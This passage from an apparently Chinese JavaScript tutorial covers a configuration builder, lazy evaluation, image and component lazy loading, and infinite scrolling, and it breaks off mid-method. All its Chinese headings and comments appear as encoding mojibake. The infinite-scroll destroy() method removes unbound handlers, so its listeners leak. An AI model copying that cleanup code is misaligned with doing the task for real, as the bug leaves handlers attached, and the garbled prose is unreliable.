  <span class="hljs-title function_">validate</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> { api } = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>;
    <span class="hljs-keyword">if</span> (!api.<span class="hljs-property">baseUrl</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'API base URL is required'</span>);
    }
    <span class="hljs-keyword">if</span> (api.<span class="hljs-property">timeout</span> &amp;&amp; api.<span class="hljs-property">timeout</span> &lt; <span class="hljs-number">100</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Timeout must be at least 100ms'</span>);
    }
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> config = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConfigurationBuilder</span>()
  .<span class="hljs-title function_">withApi</span>(<span class="hljs-string">'https://api.example.com'</span>)
  .<span class="hljs-title function_">withApiVersion</span>(<span class="hljs-string">'v1'</span>)
  .<span class="hljs-title function_">withTimeout</span>(<span class="hljs-number">5000</span>)
  .<span class="hljs-title function_">withTheme</span>(<span class="hljs-string">'dark'</span>)
  .<span class="hljs-title function_">withLanguage</span>(<span class="hljs-string">'en'</span>)
  .<span class="hljs-title function_">withDarkMode</span>(<span class="hljs-literal">true</span>)
  .<span class="hljs-title function_">enableFeature</span>(<span class="hljs-string">'analytics'</span>)
  .<span class="hljs-title function_">enableFeature</span>(<span class="hljs-string">'notifications'</span>)
  .<span class="hljs-title function_">disableFeature</span>(<span class="hljs-string">'debug'</span>)
  .<span class="hljs-title function_">withCache</span>(<span class="hljs-literal">true</span>)
  .<span class="hljs-title function_">withLazyLoad</span>(<span class="hljs-literal">true</span>)
  .<span class="hljs-title function_">build</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'App configuration:'</span>, config);
</code></pre>
<h4 data-id="heading-14">å››ã€æƒ°æ€§åŠ è½½/æ±‚å€¼ï¼ˆLazy Loading/Evaluationï¼‰</h4>
<p>æƒ°æ€§åŠ è½½å»¶è¿Ÿè®¡ç®—æˆ–åˆå§‹åŒ–, ç›´åˆ°çœŸæ­£éœ€è¦æ—¶æ‰æ‰§è¡Œ, å¯ä»¥æ˜¾è‘—æé«˜åº”ç”¨æ€§èƒ½ã€‚</p>
<h5 data-id="heading-15">4.1 æƒ°æ€§æ±‚å€¼å®ç°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æƒ°æ€§å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">lazy</span>(<span class="hljs-params">fn</span>) {
  <span class="hljs-keyword">let</span> result;
  <span class="hljs-keyword">let</span> evaluated = <span class="hljs-literal">false</span>;
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
    <span class="hljs-keyword">if</span> (!evaluated) {
      result = fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
      evaluated = <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> result;
  };
}

<span class="hljs-comment">// æƒ°æ€§å±æ€§</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">lazyProperty</span>(<span class="hljs-params">target, propertyName, getter</span>) {
  <span class="hljs-keyword">let</span> value;
  <span class="hljs-keyword">let</span> evaluated = <span class="hljs-literal">false</span>;
  
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(target, propertyName, {
    <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">if</span> (!evaluated) {
        value = getter.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);
        evaluated = <span class="hljs-literal">true</span>;
      }
      <span class="hljs-keyword">return</span> value;
    },
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>
  });
}

<span class="hljs-comment">// æƒ°æ€§ç±»å±æ€§</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyClass</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_expensiveData</span> = <span class="hljs-literal">null</span>;
  }

  <span class="hljs-keyword">get</span> <span class="hljs-title function_">expensiveData</span>() {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_expensiveData</span> === <span class="hljs-literal">null</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Computing expensive data...'</span>);
      <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶è®¡ç®—</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_expensiveData</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeExpensiveData</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_expensiveData</span>;
  }

  <span class="hljs-title function_">computeExpensiveData</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å¤æ‚çš„è®¡ç®—é€»è¾‘</span>
    <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">let</span> result = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {
      result += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(i);
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Computed in <span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now() - start}</span>ms`</span>);
    <span class="hljs-keyword">return</span> result;
  }

  <span class="hljs-comment">// é‡ç½®æƒ°æ€§å€¼</span>
  <span class="hljs-title function_">reset</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_expensiveData</span> = <span class="hljs-literal">null</span>;
  }
}
</code></pre>
<h5 data-id="heading-16">4.2 å›¾ç‰‡æ‡’åŠ è½½</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyImageLoader</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = {
      <span class="hljs-attr">root</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">rootMargin</span>: <span class="hljs-string">'0px'</span>,
      <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.1</span>,
      <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'</span>,
      ...options
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">images</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initObserver</span>();
  }

  <span class="hljs-title function_">initObserver</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-string">'IntersectionObserver'</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleIntersection</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>),
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>
      );
    }
  }

  <span class="hljs-title function_">registerImage</span>(<span class="hljs-params">imgElement, src</span>) {
    <span class="hljs-keyword">if</span> (!imgElement || !src) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// ä¿å­˜åŸå§‹src</span>
    <span class="hljs-keyword">const</span> originalSrc = imgElement.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-src'</span>) || src;
    imgElement.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'data-src'</span>, originalSrc);
    
    <span class="hljs-comment">// è®¾ç½®å ä½ç¬¦</span>
    imgElement.<span class="hljs-property">src</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">placeholder</span>;
    imgElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'lazy-load'</span>);
    
    <span class="hljs-comment">// æ·»åŠ åˆ°è§‚å¯Ÿåˆ—è¡¨</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">images</span>.<span class="hljs-title function_">set</span>(imgElement, {
      <span class="hljs-attr">src</span>: originalSrc,
      <span class="hljs-attr">loaded</span>: <span class="hljs-literal">false</span>
    });
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">observe</span>(imgElement);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// é™çº§æ–¹æ¡ˆï¼šç«‹å³åŠ è½½</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadImage</span>(imgElement);
    }
  }

  <span class="hljs-title function_">handleIntersection</span>(<span class="hljs-params">entries</span>) {
    entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">isIntersecting</span>) {
        <span class="hljs-keyword">const</span> img = entry.<span class="hljs-property">target</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadImage</span>(img);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>?.<span class="hljs-title function_">unobserve</span>(img);
      }
    });
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadImage</span>(<span class="hljs-params">imgElement</span>) {
    <span class="hljs-keyword">const</span> imageData = <span class="hljs-variable language_">this</span>.<span class="hljs-property">images</span>.<span class="hljs-title function_">get</span>(imgElement);
    <span class="hljs-keyword">if</span> (!imageData || imageData.<span class="hljs-property">loaded</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// é¢„åŠ è½½å›¾ç‰‡</span>
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">preloadImage</span>(imageData.<span class="hljs-property">src</span>);
      
      <span class="hljs-comment">// åº”ç”¨å®é™…å›¾ç‰‡</span>
      imgElement.<span class="hljs-property">src</span> = imageData.<span class="hljs-property">src</span>;
      imgElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'lazy-load'</span>);
      imgElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'lazy-loaded'</span>);
      
      imageData.<span class="hljs-property">loaded</span> = <span class="hljs-literal">true</span>;
      
      <span class="hljs-comment">// è§¦å‘åŠ è½½å®Œæˆäº‹ä»¶</span>
      imgElement.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'lazyload'</span>, {
        <span class="hljs-attr">detail</span>: { <span class="hljs-attr">src</span>: imageData.<span class="hljs-property">src</span> }
      }));
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to load image:'</span>, imageData.<span class="hljs-property">src</span>, error);
      imgElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'lazy-error'</span>);
      
      imgElement.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'lazyloaderror'</span>, {
        <span class="hljs-attr">detail</span>: { <span class="hljs-attr">src</span>: imageData.<span class="hljs-property">src</span>, error }
      }));
    }
  }

  <span class="hljs-title function_">preloadImage</span>(<span class="hljs-params">src</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
      img.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(img);
      img.<span class="hljs-property">onerror</span> = reject;
      img.<span class="hljs-property">src</span> = src;
    });
  }

  <span class="hljs-comment">// æ‰¹é‡æ³¨å†Œå›¾ç‰‡</span>
  <span class="hljs-title function_">registerAll</span>(<span class="hljs-params">selector = <span class="hljs-string">'img[data-src]'</span></span>) {
    <span class="hljs-keyword">const</span> images = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(selector);
    images.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">img</span> =&gt;</span> {
      <span class="hljs-keyword">const</span> src = img.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-src'</span>);
      <span class="hljs-keyword">if</span> (src) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">registerImage</span>(img, src);
      }
    });
  }

  <span class="hljs-comment">// å¼ºåˆ¶åŠ è½½ç‰¹å®šå›¾ç‰‡</span>
  <span class="hljs-title function_">forceLoad</span>(<span class="hljs-params">imgElement</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadImage</span>(imgElement);
  }

  <span class="hljs-comment">// æ¸…ç†</span>
  <span class="hljs-title function_">destroy</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>?.<span class="hljs-title function_">disconnect</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">images</span>.<span class="hljs-title function_">clear</span>();
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> lazyLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyImageLoader</span>({
    <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.5</span>,
    <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'/images/placeholder.png'</span>
  });
  
  <span class="hljs-comment">// æ³¨å†Œç°æœ‰å›¾ç‰‡</span>
  lazyLoader.<span class="hljs-title function_">registerAll</span>();
  
  <span class="hljs-comment">// åŠ¨æ€æ·»åŠ çš„å›¾ç‰‡</span>
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'newImagesAdded'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> newImages = event.<span class="hljs-property">detail</span>.<span class="hljs-property">images</span>;
    newImages.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">img</span> =&gt;</span> {
      lazyLoader.<span class="hljs-title function_">registerImage</span>(img, img.<span class="hljs-property">dataset</span>.<span class="hljs-property">src</span>);
    });
  });
  
  <span class="hljs-comment">// é¡µé¢ç¦»å¼€æ—¶æ¸…ç†</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-function">() =&gt;</span> {
    lazyLoader.<span class="hljs-title function_">destroy</span>();
  });
});
</code></pre>
<h5 data-id="heading-17">4.3 ç»„ä»¶æ‡’åŠ è½½(Vue/Reactç¤ºä¾‹)</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Reactç»„ä»¶æ‡’åŠ è½½</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { <span class="hljs-title class_">Suspense</span>, lazy } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// æ‡’åŠ è½½ç»„ä»¶</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">LazyComponent</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./ExpensiveComponent'</span>));

<span class="hljs-comment">// ä½¿ç”¨SuspenseåŒ…è£¹</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>My App<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>Loading...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">LazyComponent</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// Vueç»„ä»¶æ‡’åŠ è½½</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">LazyComponent</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-keyword">import</span>(<span class="hljs-string">'./ExpensiveComponent.vue'</span>);

<span class="hljs-comment">// è·¯ç”±é…ç½®ä¸­ä½¿ç”¨æ‡’åŠ è½½</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/dashboard'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./views/Dashboard.vue'</span>)
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/settings'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./views/Settings.vue'</span>)
  }
];

<span class="hljs-comment">// è‡ªå®šä¹‰æ‡’åŠ è½½å°è£…</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createLazyLoader</span>(<span class="hljs-params">importFn, loadingComponent, errorComponent</span>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">component</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span>
      };
    },
    
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">created</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> importFn();
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">component</span> = <span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span> || <span class="hljs-variable language_">module</span>;
      } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">error</span> = err;
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to load component:'</span>, err);
      } <span class="hljs-keyword">finally</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">false</span>;
      }
    },
    
    <span class="hljs-title function_">render</span>(<span class="hljs-params">h</span>) {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> &amp;&amp; loadingComponent) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">h</span>(loadingComponent);
      }
      
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">error</span> &amp;&amp; errorComponent) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">h</span>(errorComponent, { <span class="hljs-attr">error</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">error</span> });
      }
      
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">component</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">h</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">component</span>);
      }
      
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
  };
}
</code></pre>
<h5 data-id="heading-18">4.4 æ•°æ®æ‡’åŠ è½½(æ— é™æ»šåŠ¨)</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">InfiniteScroll</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = {
      <span class="hljs-attr">container</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>,
      <span class="hljs-attr">distance</span>: <span class="hljs-number">100</span>,
      <span class="hljs-attr">throttle</span>: <span class="hljs-number">200</span>,
      <span class="hljs-attr">onLoadMore</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(),
      ...options
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hasMore</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">throttleTimer</span> = <span class="hljs-literal">null</span>;
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
  }

  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">container</span> === <span class="hljs-string">'string'</span> 
      ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">container</span>)
      : <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">container</span>;
    
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Container not found'</span>);
      <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">bindEvents</span>();
  }

  <span class="hljs-title function_">bindEvents</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleScroll</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleScroll</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
  }

  <span class="hljs-title function_">handleScroll</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">throttleTimer</span>) {
      <span class="hljs-built_in">clearTimeout</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">throttleTimer</span>);
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">throttleTimer</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkPosition</span>();
    }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">throttle</span>);
  }

  <span class="hljs-title function_">checkPosition</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> || !<span class="hljs-variable language_">this</span>.<span class="hljs-property">hasMore</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">const</span> scrollTop = <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-property">scrollTop</span>;
    <span class="hljs-keyword">const</span> scrollHeight = <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-property">scrollHeight</span>;
    <span class="hljs-keyword">const</span> clientHeight = <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-property">clientHeight</span>;
    
    <span class="hljs-keyword">const</span> distanceToBottom = scrollHeight - (scrollTop + clientHeight);
    
    <span class="hljs-keyword">if</span> (distanceToBottom &lt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">distance</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadMore</span>();
    }
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadMore</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> || !<span class="hljs-variable language_">this</span>.<span class="hljs-property">hasMore</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'loadstart'</span>));
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-title function_">onLoadMore</span>();
      
      <span class="hljs-keyword">if</span> (result &amp;&amp; <span class="hljs-keyword">typeof</span> result.<span class="hljs-property">hasMore</span> === <span class="hljs-string">'boolean'</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hasMore</span> = result.<span class="hljs-property">hasMore</span>;
      }
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'load'</span>, { 
        <span class="hljs-attr">detail</span>: result 
      }));
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'error'</span>, { 
        <span class="hljs-attr">detail</span>: error 
      }));
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to load more data:'</span>, error);
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">false</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'loadend'</span>));
      
      <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦è¿˜éœ€è¦ç»§ç»­åŠ è½½ï¼ˆæ•°æ®å¯èƒ½æ²¡æœ‰å¡«æ»¡å±å¹•ï¼‰</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hasMore</span>) {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkPosition</span>(), <span class="hljs-number">100</span>);
      }
    }
  }

  <span class="hljs-comment">// æ‰‹åŠ¨è§¦å‘åŠ è½½</span>
  <span class="hljs-title function_">triggerLoad</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadMore</span>();
  }

  <span class="hljs-comment">// é‡ç½®çŠ¶æ€</span>
  <span class="hljs-title function_">reset</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hasMore</span> = <span class="hljs-literal">true</span>;
  }

  <span class="hljs-comment">// é”€æ¯</span>
  <span class="hljs-title function_">destroy</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">container</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleScroll</span>);
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleScroll</span>);
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">throttleTimer</span>) {
